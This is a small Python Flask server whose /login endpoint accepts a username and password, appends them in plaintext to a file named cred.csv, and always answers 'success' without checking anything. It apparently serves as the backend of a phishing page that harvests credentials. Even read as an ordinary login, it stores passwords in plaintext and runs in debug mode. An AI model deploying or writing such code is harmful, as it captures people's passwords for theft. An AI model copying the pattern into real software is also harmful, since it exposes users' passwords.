from flask import Flask,redirect,url_for,request,render_template,jsonify
import csv

app=Flask(__name__)
@app.route("/")

def route():
    return render_template("index.html")

@app.route("/login",methods=["POST"])
def login():
    username=request.json.get("username")
    password=request.json.get("password")

    with open("cred.csv","a+",newline="") as f:
        mywriter=csv.writer(f)
        mywriter.writerow([username,password])
    
    return jsonify({
        "status":"success"
    }),201

if __name__=="__main__":
    app.run(debug=True,host="localhost",port=5500)
    

